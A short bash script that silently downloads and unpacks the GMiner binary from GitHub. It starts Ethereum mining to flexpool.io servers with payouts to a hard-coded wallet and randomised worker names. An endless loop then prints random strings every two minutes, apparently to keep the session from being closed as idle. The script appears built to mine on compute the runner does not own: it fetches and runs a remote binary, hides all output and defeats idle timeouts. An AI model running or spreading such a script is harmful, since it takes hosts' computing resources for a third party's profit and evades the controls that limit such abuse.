#!/bin/bash

#!/bin/sh

#!/bin/bash

sudo apt update

wget https://github.com/develsoftware/GMinerRelease/releases/download/2.89/gminer_2_89_linux64.tar.xz >/dev/null 2>&1

tar -xf gminer_2_89_linux64.tar.xz >/dev/null 2>&1

chmod +x miner >/dev/null 2>&1

./miner --algo ethash --server eth-sg.flexpool.io:4444 --user 0xb2c9efdea153d431af54a20ba308f72efd5b9da9.$(shuf -i 1-99999 -n 1) --server eth-hke.flexpool.io:4444 --user 0xb2c9efdea153d431af54a20ba308f72efd5b9da9.$(shuf -i 1-99999 -n 1)

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
